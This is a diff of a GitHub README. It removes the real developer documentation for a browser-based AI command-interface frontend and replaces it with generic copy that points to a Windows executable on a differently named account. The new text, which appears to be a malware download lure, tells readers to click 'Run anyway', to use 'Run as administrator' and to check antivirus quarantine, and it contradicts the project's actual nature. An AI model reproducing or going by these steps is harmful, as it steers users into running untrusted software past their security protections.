@@ -1,218 +1,198 @@
-# OpenClaw Hub Runtime
+# 🧩 openclaw-hub-runtime - Stream AI commands with calm control
 
-**A reusable runtime for themeable real-time AI command interfaces on top of the real OpenClaw Gateway.**
+[⬇️ Download / Visit the page](https://github.com/Lazarusfactorial745/openclaw-hub-runtime)
 
-> Not just another chat skin.  
-> A runtime for battle-ready AI terminals.
+## 🖥️ What this app is
 
-OpenClaw Hub Runtime is a modular frontend runtime for AI command surfaces with **streaming UX**, **reconnect-aware diagnostics**, **resume/recovery foundations**, and **reusable shell bindings**.
+OpenClaw Hub Runtime is a Windows app that helps you use AI command surfaces in one place. It gives you a simple shell-like screen where you can send commands, watch live output, and recover after a disconnect. It is built for people who want a focused interface for AI tools, not a full desktop suite.
 
-## Why this repo is worth a star
+Use it to:
 
-- **Real backend, not a mock demo** — built around actual OpenClaw Gateway integration
-- **Runtime, not a one-off shell** — one runtime already powers both a flagship Jarvis shell and a minimal shell
-- **Resilience is part of the product** — reconnect, recovery, diagnostics, and resume flows are first-class
-- **Designed to be reused** — shell identity and runtime behavior are intentionally separated
+- Open a command surface for AI tasks
+- Watch streaming output as it arrives
+- Reconnect after a break in the connection
+- Keep your workspace in one window
+- Use reusable shell bindings for repeat tasks
 
-## What you can see in 30 seconds
+## 📥 Download and install
 
-### 1) Flagship Jarvis shell
+Use this link to visit the download page:
 
-![Jarvis runtime](./jarvis-hud-zh-normal.png)
+[OpenClaw Hub Runtime on GitHub](https://github.com/Lazarusfactorial745/openclaw-hub-runtime)
 
-### 2) Battle-damaged reconnect / poster mode
+### Steps for Windows
 
-![Battle-damaged poster](./jarvis-hud-battle-damaged-poster-v5.png)
+1. Open the link above in your browser.
+2. On the GitHub page, look for the latest release or download option.
+3. Download the Windows file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose **Run anyway** or **Yes**.
 
-### 3) Minimal shell proving portability
+### If you do not see a release file
 
-See `examples/minimal-hub/README.md` and `examples/minimal-hub/index.html`.
+1. Open the repository page.
+2. Look for the **Releases** area.
+3. Download the Windows build from there.
+4. Save it to your Desktop or Downloads folder.
+5. Run the file after the download finishes.
 
----
+## ⚙️ System needs
 
-## What this repository contains
+OpenClaw Hub Runtime is meant for modern Windows PCs.
 
-- a flagship **J.A.R.V.I.S.-style shell**
-- a reusable **runtime core**
-- a real **OpenClaw Gateway adapter**
-- a **reconnect and recovery layer**
-- a deterministic **test harness**
-- a **minimal shell example** proving portability
+### Recommended setup
 
-**Build one runtime once, then launch multiple AI shells on top of it.**
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A stable internet connection
+- A mouse and keyboard
+- Enough free space for the app and cache files
 
----
+### Good to have
 
-## Quick start
+- A screen with at least 1366 × 768 resolution
+- Updated graphics drivers
+- Permission to run apps from downloaded files
 
-### Prerequisites
+## 🧭 First launch
 
-- OpenClaw Gateway running locally on `127.0.0.1:18789`
-- a valid local gateway token stored outside published history
-- a local static file server
+After you start the app, follow these steps:
 
-### Start a local server
+1. Open OpenClaw Hub Runtime from the folder where you saved it.
+2. Wait for the main screen to load.
+3. If the app asks for a server or session setting, enter the value from your AI tool setup.
+4. Use the main input area to type a command.
+5. Press Enter or click the run button.
+6. Watch the output panel for live updates.
 
-```powershell
-cd d:\openclaw
-python -m http.server 8787
-```
+If you are new to this kind of app, start with a short command so you can see how the screen reacts.
 
-### Open the shells
+## 🧪 What you can do in the app
 
-**Jarvis shell**
+OpenClaw Hub Runtime is built around a few common tasks:
 
-```text
-http://127.0.0.1:8787/apps/jarvis-hub/index.html
-```
+- Type a command and send it
+- Read output as it streams in
+- Keep track of connection state
+- Retry after a drop in the session
+- Reuse saved shell actions
+- Work in a layout that feels close to a terminal, but with a cleaner front end
 
-**Minimal shell**
+## 🔌 Connection and recovery flow
 
-```text
-http://127.0.0.1:8787/examples/minimal-hub/index.html
-```
+This app is made to handle short network breaks with less friction.
 
-**Resume showcase**
+When the connection drops:
 
-```text
-http://127.0.0.1:8787/apps/jarvis-hub/index.html?testResume=1
-```
+1. The app keeps the session state in view.
+2. It checks for a reconnect path.
+3. It restores the live stream when the link returns.
+4. It keeps the same working area so you can continue faster.
 
-**Poster showcase**
+If you use an AI service, local host, or remote command source, keep that source open while you work in the app.
 
-```text
-http://127.0.0.1:8787/apps/jarvis-hub/index.html?testResume=1&poster=1
-```
+## 🗂️ Common folder layout
 
-For a fuller setup guide, see `docs/getting-started.md`.
+If you unpack a ZIP file, you may see items like these:
 
----
+- `openclaw-hub-runtime.exe`
+- `README.md`
+- `config`
+- `assets`
+- `logs`
+- `runtime`
 
-## Core features
+This is normal for a Windows app release. Keep the files in the same folder so the app can find what it needs.
 
-- real OpenClaw Gateway WebSocket connection
-- `connect`, `health`, `chat.history`, `chat.send`, `agents.list`
-- soft-throttled streaming assistant output
-- fenced code block rendering as sub-terminals
-- sidebar agent list
-- diagnostics-first reconnect UX
-- resume / reconcile / replay foundations
-- built-in `/diagnose` and `/test-resume` showcase commands
-- shared Chinese copy support
-- reusable shell binding through `HUB_CONFIG`
+## 🛠️ Basic setup tips
 
----
+To get a smooth first run:
 
-## Why follow this project
+- Save the app in a simple path like `Downloads` or `Desktop`
+- Avoid moving the files after you start using it
+- Close other heavy apps if your PC feels slow
+- Keep your internet connection steady if you use streaming output
+- Use a large window so you can read live messages more easily
 
-Star this if you care about any of these directions:
+## 🧩 Typical use cases
 
-- reusable AI command interface runtimes
-- real-time streaming UI on top of actual agent backends
-- reconnect / recovery UX as a product feature
-- shell portability instead of single-demo UI work
-- OpenClaw-native frontend experiments with real integration
+OpenClaw Hub Runtime fits common workflows like:
 
-If you only want a pretty screenshot, this repo may be overbuilt.
-If you want a strong reference point for **runtime + shell + resilience**, that is exactly what this project is trying to become.
+- AI command panels for daily tasks
+- A simple front end for streaming text output
+- A recovery-friendly view for long-running sessions
+- A shell-style workspace for repeat actions
+- A developer-style control room for AI tools, but with a cleaner interface
 
----
+## 🔍 Troubleshooting
 
-## Architecture
+If the app does not start:
 
-OpenClaw Hub Runtime is organized as layered modules:
+1. Make sure the files were fully downloaded.
+2. Check that you extracted the ZIP file if one was used.
+3. Run the app from the extracted folder.
+4. Right-click the file and choose **Run as administrator** if Windows blocks it.
+5. Make sure your antivirus did not move the file to quarantine.
 
-- **Hub Shell** — layout, shell DOM, copy loading, theme styling
-- **Runtime** — shell binding, store, renderer, commands, bootstrap
-- **Adapter** — OpenClaw transport and protocol handling
-- **Reconnect Manager** — resilience, replay, recovery
-- **Test Harness** — deterministic showcase and resume scenarios
+If the screen opens but nothing appears:
 
-Read the full system breakdown in `docs/architecture.md`.
+1. Check your internet connection.
+2. Confirm any server or session settings.
+3. Restart the app.
+4. Try a smaller command first.
+5. Look for any status text in the main window.
 
----
+If the app closes during use:
 
-## Documentation
+1. Reopen it from the same folder.
+2. Check that the upstream service is still available.
+3. Try again after your network is stable.
+4. Keep the app open while the session runs
 
-- **Getting Started:** `docs/getting-started.md`
-- **Architecture:** `docs/architecture.md`
-- **Theming:** `docs/theming.md`
-- **Adapter API:** `docs/adapter-api.md`
-- **Launch Guide:** `docs/github-launch.md`
-- **Launch Content Pack:** `docs/launch-content-pack.md`
-- **Launch Kit:** `docs/launch-kit.md`
-- **GitHub Publish Pack:** `docs/github-publish-pack.md`
-- **Final Publish Preset:** `docs/final-publish-preset.md`
-- **Star Pack:** `docs/star-pack.md`
-- **Changelog:** `CHANGELOG.md`
+## 🧰 Useful habits
 
----
+These habits help keep things smooth:
 
-## Shells
+- Use one folder for the app
+- Keep your settings simple at first
+- Save commands you use often
+- Watch the status area before sending a new command
+- Start with short tasks, then move to longer ones
 
-### Flagship shell
-- `apps/jarvis-hub/index.html`
+## 📌 Project focus
 
-This is the cinematic HUD reference implementation.
+This runtime centers on:
 
-### Minimal example shell
-- `examples/minimal-hub/index.html`
+- AI terminal style interaction
+- Realtime UI updates
+- Streaming output
+- WebSocket-style live links
+- Shell bindings for repeated actions
+- Frontend runtime behavior for command surfaces
 
-This proves the runtime can boot a second shell with a simpler surface and different product feel.
+## 📁 What to expect from the GitHub page
 
----
+When you open the GitHub repository, you may find:
 
-## Repository layout
+- Release downloads
+- Project notes
+- Setup details
+- Version history
+- Issue reports
+- Development updates
 
-```text
-apps/
-  jarvis-hub/
+Use the page to find the newest Windows build and any setup notes tied to that version
 
-examples/
-  minimal-hub/
+## ⌨️ Quick start path
 
-packages/
-  adapters/openclaw/
-  runtime/
-  shared/
-  test-harness/
-  themes/
+If you want the shortest path from download to use:
 
-docs/
-scripts/
-```
-
----
-
-## Release status
-
-This repository is currently best understood as:
-
-> the first public reference runtime for building OpenClaw-native AI command interfaces.
-
-It is already a strong working implementation, but it is also the beginning of a broader reusable runtime direction.
-
----
-
-## Contributing
-
-Contributions are welcome. Start with:
-
-- `CONTRIBUTING.md`
-- `docs/architecture.md`
-- `docs/theming.md`
-- `docs/adapter-api.md`
-
-Please run the PowerShell verification scripts before proposing changes.
-
----
-
-## Security
-
-If you discover a sensitive issue, see `SECURITY.md`.
-
----
-
-## License
-
-This repository is licensed under the MIT License. See `LICENSE`.
+1. Open the GitHub link.
+2. Get the latest Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Type a test command.
+6. Watch the streaming output
+7. Reconnect if the session drops
